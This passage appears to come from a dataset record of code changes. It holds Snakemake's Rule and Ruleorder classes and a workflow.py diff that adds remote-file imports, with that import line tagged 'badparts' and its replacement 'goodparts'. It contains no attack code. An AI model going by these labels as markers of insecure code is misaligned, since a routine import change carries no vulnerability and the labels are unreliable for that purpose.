\"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport sys\nimport inspect\nimport sre_constants\nfrom collections import defaultdict\n\nfrom snakemake.io import IOFile, _IOFile, protected, temp, dynamic, Namedlist\nfrom snakemake.io import expand, InputFiles, OutputFiles, Wildcards, Params, Log\nfrom snakemake.io import apply_wildcards, is_flagged, not_iterable\nfrom snakemake.exceptions import RuleException, IOFileException, WildcardError, InputFunctionException\n\n\nclass Rule:\n    def __init__(self, *args, lineno=None, snakefile=None):\n        \"\"\"\n        Create a rule\n\n        Arguments\n        name -- the name of the rule\n        \"\"\"\n        if len(args) == 2:\n            name, workflow = args\n            self.name = name\n            self.workflow = workflow\n            self.docstring = None\n            self.message = None\n            self._input = InputFiles()\n            self._output = OutputFiles()\n            self._params = Params()\n            self.dependencies = dict()\n            self.dynamic_output = set()\n            self.dynamic_input = set()\n            self.temp_output = set()\n            self.protected_output = set()\n            self.touch_output = set()\n            self.subworkflow_input = dict()\n            self.resources = dict(_cores=1, _nodes=1)\n            self.priority = 0\n            self.version = None\n            self._log = Log()\n            self._benchmark = None\n            self.wildcard_names = set()\n            self.lineno = lineno\n            self.snakefile = snakefile\n            self.run_func = None\n            self.shellcmd = None\n            self.norun = False\n        elif len(args) == 1:\n            other = args[0]\n            self.name = other.name\n            self.workflow = other.workflow\n            self.docstring = other.docstring\n            self.message = other.message\n            self._input = InputFiles(other._input)\n            self._output = OutputFiles(other._output)\n            self._params = Params(other._params)\n            self.dependencies = dict(other.dependencies)\n            self.dynamic_output = set(other.dynamic_output)\n            self.dynamic_input = set(other.dynamic_input)\n            self.temp_output = set(other.temp_output)\n            self.protected_output = set(other.protected_output)\n            self.touch_output = set(other.touch_output)\n            self.subworkflow_input = dict(other.subworkflow_input)\n            self.resources = other.resources\n            self.priority = other.priority\n            self.version = other.version\n            self._log = other._log\n            self._benchmark = other._benchmark\n            self.wildcard_names = set(other.wildcard_names)\n            self.lineno = other.lineno\n            self.snakefile = other.snakefile\n            self.run_func = other.run_func\n            self.shellcmd = other.shellcmd\n            self.norun = other.norun\n\n    def dynamic_branch(self, wildcards, input=True):\n        def get_io(rule):\n            return (rule.input, rule.dynamic_input) if input else (\n                rule.output, rule.dynamic_output\n            )\n\n        io, dynamic_io = get_io(self)\n\n        branch = Rule(self)\n        io_, dynamic_io_ = get_io(branch)\n\n        expansion = defaultdict(list)\n        for i, f in enumerate(io):\n            if f in dynamic_io:\n                try:\n                    for e in reversed(expand(f, zip, **wildcards)):\n                        expansion[i].append(IOFile(e, rule=branch))\n                except KeyError:\n                    return None\n\n        # replace the dynamic files with the expanded files\n        replacements = [(i, io[i], e)\n                        for i, e in reversed(list(expansion.items()))]\n        for i, old, exp in replacements:\n            dynamic_io_.remove(old)\n            io_.insert_items(i, exp)\n\n        if not input:\n            for i, old, exp in replacements:\n                if old in branch.temp_output:\n                    branch.temp_output.discard(old)\n                    branch.temp_output.update(exp)\n                if old in branch.protected_output:\n                    branch.protected_output.discard(old)\n                    branch.protected_output.update(exp)\n                if old in branch.touch_output:\n                    branch.touch_output.discard(old)\n                    branch.touch_output.update(exp)\n\n            branch.wildcard_names.clear()\n            non_dynamic_wildcards = dict((name, values[0])\n                                         for name, values in wildcards.items()\n                                         if len(set(values)) == 1)\n            # TODO have a look into how to concretize dependencies here\n            (branch._input, branch._output, branch._params, branch._log,\n             branch._benchmark, _, branch.dependencies\n             ) = branch.expand_wildcards(wildcards=non_dynamic_wildcards)\n            return branch, non_dynamic_wildcards\n        return branch\n\n    def has_wildcards(self):\n        \"\"\"\n        Return True if rule contains wildcards.\n        \"\"\"\n        return bool(self.wildcard_names)\n\n    @property\n    def benchmark(self):\n        return self._benchmark\n\n    @benchmark.setter\n    def benchmark(self, benchmark):\n        self._benchmark = IOFile(benchmark, rule=self)\n\n    @property\n    def input(self):\n        return self._input\n\n    def set_input(self, *input, **kwinput):\n        \"\"\"\n        Add a list of input files. Recursive lists are flattened.\n\n        Arguments\n        input -- the list of input files\n        \"\"\"\n        for item in input:\n            self._set_inoutput_item(item)\n        for name, item in kwinput.items():\n            self._set_inoutput_item(item, name=name)\n\n    @property\n    def output(self):\n        return self._output\n\n    @property\n    def products(self):\n        products = list(self.output)\n        if self.benchmark:\n            products.append(self.benchmark)\n        return products\n\n    def set_output(self, *output, **kwoutput):\n        \"\"\"\n        Add a list of output files. Recursive lists are flattened.\n\n        Arguments\n        output -- the list of output files\n        \"\"\"\n        for item in output:\n            self._set_inoutput_item(item, output=True)\n        for name, item in kwoutput.items():\n            self._set_inoutput_item(item, output=True, name=name)\n\n        for item in self.output:\n            if self.dynamic_output and item not in self.dynamic_output:\n                raise SyntaxError(\n                    \"A rule with dynamic output may not define any \"\n                    \"non-dynamic output files.\")\n            wildcards = item.get_wildcard_names()\n            if self.wildcard_names:\n                if self.wildcard_names != wildcards:\n                    raise SyntaxError(\n                        \"Not all output files of rule {} \"\n                        \"contain the same wildcards.\".format(self.name))\n            else:\n                self.wildcard_names = wildcards\n\n    def _set_inoutput_item(self, item, output=False, name=None):\n        \"\"\"\n        Set an item to be input or output.\n\n        Arguments\n        item     -- the item\n        inoutput -- either a Namedlist of input or output items\n        name     -- an optional name for the item\n        \"\"\"\n        inoutput = self.output if output else self.input\n        if isinstance(item, str):\n            # add the rule to the dependencies\n            if isinstance(item, _IOFile):\n                self.dependencies[item] = item.rule\n            _item = IOFile(item, rule=self)\n            if is_flagged(item, \"temp\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be temporary\")\n                self.temp_output.add(_item)\n            if is_flagged(item, \"protected\"):\n                if not output:\n                    raise SyntaxError(\"Only output files may be protected\")\n                self.protected_output.add(_item)\n            if is_flagged(item, \"touch\"):\n                if not output:\n                    raise SyntaxError(\n                        \"Only output files may be marked for touching.\")\n                self.touch_output.add(_item)\n            if is_flagged(item, \"dynamic\"):\n                if output:\n                    self.dynamic_output.add(_item)\n                else:\n                    self.dynamic_input.add(_item)\n            if is_flagged(item, \"subworkflow\"):\n                if output:\n                    raise SyntaxError(\n                        \"Only input files may refer to a subworkflow\")\n                else:\n                    # record the workflow this item comes from\n                    self.subworkflow_input[_item] = item.flags[\"subworkflow\"]\n            inoutput.append(_item)\n            if name:\n                inoutput.add_name(name)\n        elif callable(item):\n            if output:\n                raise SyntaxError(\n                    \"Only input files can be specified as functions\")\n            inoutput.append(item)\n            if name:\n                inoutput.add_name(name)\n        else:\n            try:\n                start = len(inoutput)\n                for i in item:\n                    self._set_inoutput_item(i, output=output)\n                if name:\n                    # if the list was named, make it accessible\n                    inoutput.set_name(name, start, end=len(inoutput))\n            except TypeError:\n                raise SyntaxError(\n                    \"Input and output files have to be specified as strings or lists of strings.\")\n\n    @property\n    def params(self):\n        return self._params\n\n    def set_params(self, *params, **kwparams):\n        for item in params:\n            self._set_params_item(item)\n        for name, item in kwparams.items():\n            self._set_params_item(item, name=name)\n\n    def _set_params_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.params.append(item)\n            if name:\n                self.params.add_name(name)\n        else:\n            try:\n                start = len(self.params)\n                for i in item:\n                    self._set_params_item(i)\n                if name:\n                    self.params.set_name(name, start, end=len(self.params))\n            except TypeError:\n                raise SyntaxError(\"Params have to be specified as strings.\")\n\n    @property\n    def log(self):\n        return self._log\n\n    def set_log(self, *logs, **kwlogs):\n        for item in logs:\n            self._set_log_item(item)\n        for name, item in kwlogs.items():\n            self._set_log_item(item, name=name)\n\n    def _set_log_item(self, item, name=None):\n        if isinstance(item, str) or callable(item):\n            self.log.append(IOFile(item,\n                                   rule=self)\n                            if isinstance(item, str) else item)\n            if name:\n                self.log.add_name(name)\n        else:\n            try:\n                start = len(self.log)\n                for i in item:\n                    self._set_log_item(i)\n                if name:\n                    self.log.set_name(name, start, end=len(self.log))\n            except TypeError:\n                raise SyntaxError(\"Log files have to be specified as strings.\")\n\n    def expand_wildcards(self, wildcards=None):\n        \"\"\"\n        Expand wildcards depending on the requested output\n        or given wildcards dict.\n        \"\"\"\n\n        def concretize_iofile(f, wildcards):\n            if not isinstance(f, _IOFile):\n                return IOFile(f, rule=self)\n            else:\n                return f.apply_wildcards(wildcards,\n                                         fill_missing=f in self.dynamic_input,\n                                         fail_dynamic=self.dynamic_output)\n\n        def _apply_wildcards(newitems, olditems, wildcards, wildcards_obj,\n                             concretize=apply_wildcards,\n                             ruleio=None):\n            for name, item in olditems.allitems():\n                start = len(newitems)\n                is_iterable = True\n                if callable(item):\n                    try:\n                        item = item(wildcards_obj)\n                    except (Exception, BaseException) as e:\n                        raise InputFunctionException(e, rule=self)\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        if not isinstance(item_, str):\n                            raise RuleException(\n                                \"Input function did not return str or list of str.\",\n                                rule=self)\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                else:\n                    if not_iterable(item):\n                        item = [item]\n                        is_iterable = False\n                    for item_ in item:\n                        concrete = concretize(item_, wildcards)\n                        newitems.append(concrete)\n                        if ruleio is not None:\n                            ruleio[concrete] = item_\n                if name:\n                    newitems.set_name(\n                        name, start,\n                        end=len(newitems) if is_iterable else None)\n\n        if wildcards is None:\n            wildcards = dict()\n        missing_wildcards = self.wildcard_names - set(wildcards.keys())\n\n        if missing_wildcards:\n            raise RuleException(\n                \"Could not resolve wildcards in rule {}:\\n{}\".format(\n                    self.name, \"\\n\".join(self.wildcard_names)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n        ruleio = dict()\n\n        try:\n            input = InputFiles()\n            wildcards_obj = Wildcards(fromdict=wildcards)\n            _apply_wildcards(input, self.input, wildcards, wildcards_obj,\n                             concretize=concretize_iofile,\n                             ruleio=ruleio)\n\n            params = Params()\n            _apply_wildcards(params, self.params, wildcards, wildcards_obj)\n\n            output = OutputFiles(o.apply_wildcards(wildcards)\n                                 for o in self.output)\n            output.take_names(self.output.get_names())\n\n            dependencies = {\n                None if f is None else f.apply_wildcards(wildcards): rule\n                for f, rule in self.dependencies.items()\n            }\n\n            ruleio.update(dict((f, f_) for f, f_ in zip(output, self.output)))\n\n            log = Log()\n            _apply_wildcards(log, self.log, wildcards, wildcards_obj,\n                             concretize=concretize_iofile)\n\n            benchmark = self.benchmark.apply_wildcards(\n                wildcards) if self.benchmark else None\n            return input, output, params, log, benchmark, ruleio, dependencies\n        except WildcardError as ex:\n            # this can only happen if an input contains an unresolved wildcard.\n            raise RuleException(\n                \"Wildcards in input, params, log or benchmark file of rule {} cannot be \"\n                \"determined from output files:\\n{}\".format(self, str(ex)),\n                lineno=self.lineno,\n                snakefile=self.snakefile)\n\n    def is_producer(self, requested_output):\n        \"\"\"\n        Returns True if this rule is a producer of the requested output.\n        \"\"\"\n        try:\n            for o in self.products:\n                if o.match(requested_output):\n                    return True\n            return False\n        except sre_constants.error as ex:\n            raise IOFileException(\"{} in wildcard statement\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n        except ValueError as ex:\n            raise IOFileException(\"{}\".format(ex),\n                                  snakefile=self.snakefile,\n                                  lineno=self.lineno)\n\n    def get_wildcards(self, requested_output):\n        \"\"\"\n        Update the given wildcard dictionary by matching regular expression\n        output files to the requested concrete ones.\n\n        Arguments\n        wildcards -- a dictionary of wildcards\n        requested_output -- a concrete filepath\n        \"\"\"\n        if requested_output is None:\n            return dict()\n        bestmatchlen = 0\n        bestmatch = None\n\n        for o in self.products:\n            match = o.match(requested_output)\n            if match:\n                l = self.get_wildcard_len(match.groupdict())\n                if not bestmatch or bestmatchlen > l:\n                    bestmatch = match.groupdict()\n                    bestmatchlen = l\n        return bestmatch\n\n    @staticmethod\n    def get_wildcard_len(wildcards):\n        \"\"\"\n        Return the length of the given wildcard values.\n\n        Arguments\n        wildcards -- a dict of wildcards\n        \"\"\"\n        return sum(map(len, wildcards.values()))\n\n    def __lt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp < 0\n\n    def __gt__(self, rule):\n        comp = self.workflow._ruleorder.compare(self, rule)\n        return comp > 0\n\n    def __str__(self):\n        return self.name\n\n    def __hash__(self):\n        return self.name.__hash__()\n\n    def __eq__(self, other):\n        return self.name == other.name\n\n\nclass Ruleorder:\n    def __init__(self):\n        self.order = list()\n\n    def add(self, *rulenames):\n        \"\"\"\n        Records the order of given rules as rule1 > rule2 > rule3, ...\n        \"\"\"\n        self.order.append(list(rulenames))\n\n    def compare(self, rule1, rule2):\n        \"\"\"\n        Return whether rule2 has a higher priority than rule1.\n        \"\"\"\n        # try the last clause first,\n        # i.e. clauses added later overwrite those before.\n        for clause in reversed(self.order):\n            try:\n                i = clause.index(rule1.name)\n                j = clause.index(rule2.name)\n                # rules with higher priority should have a smaller index\n                comp = j - i\n                if comp < 0:\n                    comp = -1\n                elif comp > 0:\n                    comp = 1\n                return comp\n            except ValueError:\n                pass\n\n        # if not ruleorder given, prefer rule without wildcards\n        wildcard_cmp = rule2.has_wildcards() - rule1.has_wildcards()\n        if wildcard_cmp != 0:\n            return wildcard_cmp\n\n        return 0\n\n    def __iter__(self):\n        return self.order.__iter__()\n"}, "/snakemake/workflow.py": {"changes": [{"diff": "\n from snakemake.scheduler import JobScheduler\n from snakemake.parser import parse\n import snakemake.io\n-from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\n+from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch\n from snakemake.persistence import Persistence\n from snakemake.utils import upd", "add": 1, "remove": 1, "filename": "/snakemake/workflow.py", "badparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch"], "goodparts": ["from snakemake.io import protected, temp, temporary, expand, dynamic, remote, glob_wildcards, glob_wildcards_remote, flag, not_iterable, touch"]}], "source": "\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import re import os import sys import signal import json import urllib from collections import OrderedDict from itertools import filterfalse, chain from functools import partial from operator import attrgetter from snakemake.logging import logger, format_resources, format_resource_names from snakemake.rules import Rule, Ruleorder from snakemake.exceptions import RuleException, CreateRuleException, \\ UnknownRuleException, NoRulesException, print_exception, WorkflowError from snakemake.shell import shell from snakemake.dag import DAG from snakemake.scheduler import JobScheduler from snakemake.parser import parse import snakemake.io from snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch from snakemake.persistence import Persistence from snakemake.utils import update_config class Workflow: def __init__(self, snakefile=None, snakemakepath=None, jobscript=None, overwrite_shellcmd=None, overwrite_config=dict(), overwrite_workdir=None, overwrite_configfile=None, config_args=None, debug=False): \"\"\" Create the controller. \"\"\" self._rules=OrderedDict() self.first_rule=None self._workdir=None self.overwrite_workdir=overwrite_workdir self.workdir_init=os.path.abspath(os.curdir) self._ruleorder=Ruleorder() self._localrules=set() self.linemaps=dict() self.rule_count=0 self.basedir=os.path.dirname(snakefile) self.snakefile=os.path.abspath(snakefile) self.snakemakepath=snakemakepath self.included=[] self.included_stack=[] self.jobscript=jobscript self.persistence=None self.global_resources=None self.globals=globals() self._subworkflows=dict() self.overwrite_shellcmd=overwrite_shellcmd self.overwrite_config=overwrite_config self.overwrite_configfile=overwrite_configfile self.config_args=config_args self._onsuccess=lambda log: None self._onerror=lambda log: None self.debug=debug global config config=dict() config.update(self.overwrite_config) global rules rules=Rules() @property def subworkflows(self): return self._subworkflows.values() @property def rules(self): return self._rules.values() @property def concrete_files(self): return( file for rule in self.rules for file in chain(rule.input, rule.output) if not callable(file) and not file.contains_wildcard() ) def check(self): for clause in self._ruleorder: for rulename in clause: if not self.is_rule(rulename): raise UnknownRuleException( rulename, prefix=\"Error in ruleorder definition.\") def add_rule(self, name=None, lineno=None, snakefile=None): \"\"\" Add a rule. \"\"\" if name is None: name=str(len(self._rules) +1) if self.is_rule(name): raise CreateRuleException( \"The name{} is already used by another rule\".format(name)) rule=Rule(name, self, lineno=lineno, snakefile=snakefile) self._rules[rule.name]=rule self.rule_count +=1 if not self.first_rule: self.first_rule=rule.name return name def is_rule(self, name): \"\"\" Return True if name is the name of a rule. Arguments name --a name \"\"\" return name in self._rules def get_rule(self, name): \"\"\" Get rule by name. Arguments name --the name of the rule \"\"\" if not self._rules: raise NoRulesException() if not name in self._rules: raise UnknownRuleException(name) return self._rules[name] def list_rules(self, only_targets=False): rules=self.rules if only_targets: rules=filterfalse(Rule.has_wildcards, rules) for rule in rules: logger.rule_info(name=rule.name, docstring=rule.docstring) def list_resources(self): for resource in set( resource for rule in self.rules for resource in rule.resources): if resource not in \"_cores _nodes\".split(): logger.info(resource) def is_local(self, rule): return rule.name in self._localrules or rule.norun def execute(self, targets=None, dryrun=False, touch=False, cores=1, nodes=1, local_cores=1, forcetargets=False, forceall=False, forcerun=None, prioritytargets=None, quiet=False, keepgoing=False, printshellcmds=False, printreason=False, printdag=False, cluster=None, cluster_config=None, cluster_sync=None, jobname=None, immediate_submit=False, ignore_ambiguity=False, printrulegraph=False, printd3dag=False, drmaa=None, stats=None, force_incomplete=False, ignore_incomplete=False, list_version_changes=False, list_code_changes=False, list_input_changes=False, list_params_changes=False, summary=False, detailed_summary=False, latency_wait=3, benchmark_repeats=3, wait_for_files=None, nolock=False, unlock=False, resources=None, notemp=False, nodeps=False, cleanup_metadata=None, subsnakemake=None, updated_files=None, keep_target_files=False, allowed_rules=None, greediness=1.0, no_hooks=False): self.global_resources=dict() if resources is None else resources self.global_resources[\"_cores\"]=cores self.global_resources[\"_nodes\"]=nodes def rules(items): return map(self._rules.__getitem__, filter(self.is_rule, items)) if keep_target_files: def files(items): return filterfalse(self.is_rule, items) else: def files(items): return map(os.path.relpath, filterfalse(self.is_rule, items)) if not targets: targets=[self.first_rule ] if self.first_rule is not None else list() if prioritytargets is None: prioritytargets=list() if forcerun is None: forcerun=list() priorityrules=set(rules(prioritytargets)) priorityfiles=set(files(prioritytargets)) forcerules=set(rules(forcerun)) forcefiles=set(files(forcerun)) targetrules=set(chain(rules(targets), filterfalse(Rule.has_wildcards, priorityrules), filterfalse(Rule.has_wildcards, forcerules))) targetfiles=set(chain(files(targets), priorityfiles, forcefiles)) if forcetargets: forcefiles.update(targetfiles) forcerules.update(targetrules) rules=self.rules if allowed_rules: rules=[rule for rule in rules if rule.name in set(allowed_rules)] if wait_for_files is not None: try: snakemake.io.wait_for_files(wait_for_files, latency_wait=latency_wait) except IOError as e: logger.error(str(e)) return False dag=DAG( self, rules, dryrun=dryrun, targetfiles=targetfiles, targetrules=targetrules, forceall=forceall, forcefiles=forcefiles, forcerules=forcerules, priorityfiles=priorityfiles, priorityrules=priorityrules, ignore_ambiguity=ignore_ambiguity, force_incomplete=force_incomplete, ignore_incomplete=ignore_incomplete or printdag or printrulegraph, notemp=notemp) self.persistence=Persistence( nolock=nolock, dag=dag, warn_only=dryrun or printrulegraph or printdag or summary or list_version_changes or list_code_changes or list_input_changes or list_params_changes) if cleanup_metadata: for f in cleanup_metadata: self.persistence.cleanup_metadata(f) return True dag.init() dag.check_dynamic() if unlock: try: self.persistence.cleanup_locks() logger.info(\"Unlocking working directory.\") return True except IOError: logger.error(\"Error: Unlocking the directory{} failed. Maybe \" \"you don't have the permissions?\") return False try: self.persistence.lock() except IOError: logger.error( \"Error: Directory cannot be locked. Please make \" \"sure that no other Snakemake process is trying to create \" \"the same files in the following directory:\\n{}\\n\" \"If you are sure that no other \" \"instances of snakemake are running on this directory, \" \"the remaining lock was likely caused by a kill signal or \" \"a power loss. It can be removed with \" \"the --unlock argument.\".format(os.getcwd())) return False if self.subworkflows and not printdag and not printrulegraph: globals_backup=dict(self.globals) for subworkflow in self.subworkflows: subworkflow_targets=subworkflow.targets(dag) updated=list() if subworkflow_targets: logger.info( \"Executing subworkflow{}.\".format(subworkflow.name)) if not subsnakemake(subworkflow.snakefile, workdir=subworkflow.workdir, targets=subworkflow_targets, updated_files=updated): return False dag.updated_subworkflow_files.update(subworkflow.target(f) for f in updated) else: logger.info(\"Subworkflow{}: Nothing to be done.\".format( subworkflow.name)) if self.subworkflows: logger.info(\"Executing main workflow.\") self.globals.update(globals_backup) dag.check_incomplete() dag.postprocess() if nodeps: missing_input=[f for job in dag.targetjobs for f in job.input if dag.needrun(job) and not os.path.exists(f)] if missing_input: logger.error( \"Dependency resolution disabled(--nodeps) \" \"but missing input \" \"files detected. If this happens on a cluster, please make sure \" \"that you handle the dependencies yourself or turn of \" \"--immediate-submit. Missing input files:\\n{}\".format( \"\\n\".join(missing_input))) return False updated_files.extend(f for job in dag.needrun_jobs for f in job.output) if printd3dag: dag.d3dag() return True elif printdag: print(dag) return True elif printrulegraph: print(dag.rule_dot()) return True elif summary: print(\"\\n\".join(dag.summary(detailed=False))) return True elif detailed_summary: print(\"\\n\".join(dag.summary(detailed=True))) return True elif list_version_changes: items=list( chain(*map(self.persistence.version_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_code_changes: items=list(chain(*map(self.persistence.code_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_input_changes: items=list(chain(*map(self.persistence.input_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True elif list_params_changes: items=list( chain(*map(self.persistence.params_changed, dag.jobs))) if items: print(*items, sep=\"\\n\") return True scheduler=JobScheduler(self, dag, cores, local_cores=local_cores, dryrun=dryrun, touch=touch, cluster=cluster, cluster_config=cluster_config, cluster_sync=cluster_sync, jobname=jobname, immediate_submit=immediate_submit, quiet=quiet, keepgoing=keepgoing, drmaa=drmaa, printreason=printreason, printshellcmds=printshellcmds, latency_wait=latency_wait, benchmark_repeats=benchmark_repeats, greediness=greediness) if not dryrun and not quiet: if len(dag): if cluster or cluster_sync or drmaa: logger.resources_info( \"Provided cluster nodes:{}\".format(nodes)) else: logger.resources_info(\"Provided cores:{}\".format(cores)) logger.resources_info(\"Rules claiming more threads will be scaled down.\") provided_resources=format_resources(resources) if provided_resources: logger.resources_info( \"Provided resources: \" +provided_resources) ignored_resources=format_resource_names( set(resource for job in dag.needrun_jobs for resource in job.resources_dict if resource not in resources)) if ignored_resources: logger.resources_info( \"Ignored resources: \" +ignored_resources) logger.run_info(\"\\n\".join(dag.stats())) else: logger.info(\"Nothing to be done.\") if dryrun and not len(dag): logger.info(\"Nothing to be done.\") success=scheduler.schedule() if success: if dryrun: if not quiet and len(dag): logger.run_info(\"\\n\".join(dag.stats())) elif stats: scheduler.stats.to_json(stats) if not dryrun and not no_hooks: self._onsuccess(logger.get_logfile()) return True else: if not dryrun and not no_hooks: self._onerror(logger.get_logfile()) return False def include(self, snakefile, overwrite_first_rule=False, print_compilation=False, overwrite_shellcmd=None): \"\"\" Include a snakefile. \"\"\" if not urllib.parse.urlparse(snakefile).scheme: if not os.path.isabs(snakefile) and self.included_stack: current_path=os.path.dirname(self.included_stack[-1]) snakefile=os.path.join(current_path, snakefile) snakefile=os.path.abspath(snakefile) if snakefile in self.included: logger.info(\"Multiple include of{} ignored\".format(snakefile)) return self.included.append(snakefile) self.included_stack.append(snakefile) global workflow workflow=self first_rule=self.first_rule code, linemap=parse(snakefile, overwrite_shellcmd=self.overwrite_shellcmd) if print_compilation: print(code) sys.path.insert(0, os.path.dirname(snakefile)) self.linemaps[snakefile]=linemap exec(compile(code, snakefile, \"exec\"), self.globals) if not overwrite_first_rule: self.first_rule=first_rule self.included_stack.pop() def onsuccess(self, func): self._onsuccess=func def onerror(self, func): self._onerror=func def workdir(self, workdir): if self.overwrite_workdir is None: if not os.path.exists(workdir): os.makedirs(workdir) self._workdir=workdir os.chdir(workdir) def configfile(self, jsonpath): \"\"\" Update the global config with the given dictionary. \"\"\" global config c=snakemake.io.load_configfile(jsonpath) update_config(config, c) update_config(config, self.overwrite_config) def ruleorder(self, *rulenames): self._ruleorder.add(*rulenames) def subworkflow(self, name, snakefile=None, workdir=None): sw=Subworkflow(self, name, snakefile, workdir) self._subworkflows[name]=sw self.globals[name]=sw.target def localrules(self, *rulenames): self._localrules.update(rulenames) def rule(self, name=None, lineno=None, snakefile=None): name=self.add_rule(name, lineno, snakefile) rule=self.get_rule(name) def decorate(ruleinfo): if ruleinfo.input: rule.set_input(*ruleinfo.input[0], **ruleinfo.input[1]) if ruleinfo.output: rule.set_output(*ruleinfo.output[0], **ruleinfo.output[1]) if ruleinfo.params: rule.set_params(*ruleinfo.params[0], **ruleinfo.params[1]) if ruleinfo.threads: if not isinstance(ruleinfo.threads, int): raise RuleException(\"Threads value has to be an integer.\", rule=rule) rule.resources[\"_cores\"]=ruleinfo.threads if ruleinfo.resources: args, resources=ruleinfo.resources if args: raise RuleException(\"Resources have to be named.\") if not all(map(lambda r: isinstance(r, int), resources.values())): raise RuleException( \"Resources values have to be integers.\", rule=rule) rule.resources.update(resources) if ruleinfo.priority: if(not isinstance(ruleinfo.priority, int) and not isinstance(ruleinfo.priority, float)): raise RuleException(\"Priority values have to be numeric.\", rule=rule) rule.priority=ruleinfo.priority if ruleinfo.version: rule.version=ruleinfo.version if ruleinfo.log: rule.set_log(*ruleinfo.log[0], **ruleinfo.log[1]) if ruleinfo.message: rule.message=ruleinfo.message if ruleinfo.benchmark: rule.benchmark=ruleinfo.benchmark rule.norun=ruleinfo.norun rule.docstring=ruleinfo.docstring rule.run_func=ruleinfo.func rule.shellcmd=ruleinfo.shellcmd ruleinfo.func.__name__=\"__{}\".format(name) self.globals[ruleinfo.func.__name__]=ruleinfo.func setattr(rules, name, rule) return ruleinfo.func return decorate def docstring(self, string): def decorate(ruleinfo): ruleinfo.docstring=string return ruleinfo return decorate def input(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.input=(paths, kwpaths) return ruleinfo return decorate def output(self, *paths, **kwpaths): def decorate(ruleinfo): ruleinfo.output=(paths, kwpaths) return ruleinfo return decorate def params(self, *params, **kwparams): def decorate(ruleinfo): ruleinfo.params=(params, kwparams) return ruleinfo return decorate def message(self, message): def decorate(ruleinfo): ruleinfo.message=message return ruleinfo return decorate def benchmark(self, benchmark): def decorate(ruleinfo): ruleinfo.benchmark=benchmark return ruleinfo return decorate def threads(self, threads): def decorate(ruleinfo): ruleinfo.threads=threads return ruleinfo return decorate def resources(self, *args, **resources): def decorate(ruleinfo): ruleinfo.resources=(args, resources) return ruleinfo return decorate def priority(self, priority): def decorate(ruleinfo): ruleinfo.priority=priority return ruleinfo return decorate def version(self, version): def decorate(ruleinfo): ruleinfo.version=version return ruleinfo return decorate def log(self, *logs, **kwlogs): def decorate(ruleinfo): ruleinfo.log=(logs, kwlogs) return ruleinfo return decorate def shellcmd(self, cmd): def decorate(ruleinfo): ruleinfo.shellcmd=cmd return ruleinfo return decorate def norun(self): def decorate(ruleinfo): ruleinfo.norun=True return ruleinfo return decorate def run(self, func): return RuleInfo(func) @staticmethod def _empty_decorator(f): return f class RuleInfo: def __init__(self, func): self.func=func self.shellcmd=None self.norun=False self.input=None self.output=None self.params=None self.message=None self.benchmark=None self.threads=None self.resources=None self.priority=None self.version=None self.log=None self.docstring=None class Subworkflow: def __init__(self, workflow, name, snakefile, workdir): self.workflow=workflow self.name=name self._snakefile=snakefile self._workdir=workdir @property def snakefile(self): if self._snakefile is None: return os.path.abspath(os.path.join(self.workdir, \"Snakefile\")) if not os.path.isabs(self._snakefile): return os.path.abspath(os.path.join(self.workflow.basedir, self._snakefile)) return self._snakefile @property def workdir(self): workdir=\".\" if self._workdir is None else self._workdir if not os.path.isabs(workdir): return os.path.abspath(os.path.join(self.workflow.basedir, workdir)) return workdir def target(self, paths): if not_iterable(paths): return flag(os.path.join(self.workdir, paths), \"subworkflow\", self) return[self.target(path) for path in paths] def targets(self, dag): return[f for job in dag.jobs for f in job.subworkflow_input if job.subworkflow_input[f] is self] class Rules: \"\"\" A namespace for rules so that they can be accessed via dot notation. \"\"\" pass def srcdir(path): \"\"\"Return the absolute path, relative to the source directory of the current Snakefile.\"\"\" if not workflow.included_stack: return None return os.path.join(os.path.dirname(workflow.included_stack[-1]), path) ", "sourceWithComments": "__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport re\nimport os\nimport sys\nimport signal\nimport json\nimport urllib\nfrom collections import OrderedDict\nfrom itertools import filterfalse, chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.logging import logger, format_resources, format_resource_names\nfrom snakemake.rules import Rule, Ruleorder\nfrom snakemake.exceptions import RuleException, CreateRuleException, \\\n    UnknownRuleException, NoRulesException, print_exception, WorkflowError\nfrom snakemake.shell import shell\nfrom snakemake.dag import DAG\nfrom snakemake.scheduler import JobScheduler\nfrom snakemake.parser import parse\nimport snakemake.io\nfrom snakemake.io import protected, temp, temporary, expand, dynamic, glob_wildcards, flag, not_iterable, touch\nfrom snakemake.persistence import Persistence\nfrom snakemake.utils import update_config\n\n\nclass Workflow:\n    def __init__(self,\n                 snakefile=None,\n                 snakemakepath=None,\n                 jobscript=None,\n                 overwrite_shellcmd=None,\n                 overwrite_config=dict(),\n                 overwrite_workdir=None,\n                 overwrite_configfile=None,\n                 config_args=None,\n                 debug=False):\n        \"\"\"\n        Create the controller.\n        \"\"\"\n        self._rules = OrderedDict()\n        self.first_rule = None\n        self._workdir = None\n        self.overwrite_workdir = overwrite_workdir\n        self.workdir_init = os.path.abspath(os.curdir)\n        self._ruleorder = Ruleorder()\n        self._localrules = set()\n        self.linemaps = dict()\n        self.rule_count = 0\n        self.basedir = 